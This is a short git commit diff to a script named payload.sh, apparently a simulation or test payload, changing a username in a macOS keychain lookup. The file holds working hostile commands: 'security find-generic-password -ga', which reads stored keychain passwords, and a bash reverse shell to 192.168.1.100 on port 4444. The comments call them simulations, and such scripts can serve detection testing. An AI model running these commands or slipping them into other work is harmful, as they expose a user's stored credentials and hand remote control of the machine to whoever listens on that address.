f301402d546f04fb0cc3030ce65e13a1303c0cf4
Katherine Huang <116393413+huangkatherine7@users.noreply.github.com>
2025-03-24 20:35:28 -0400

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,5 +1,5 @@
 # Simulate accessing macOS keychain
-security find-generic-password -ga test_user
+security find-generic-password -ga testuser
 
 # Simulate creating a reverse shell
 bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
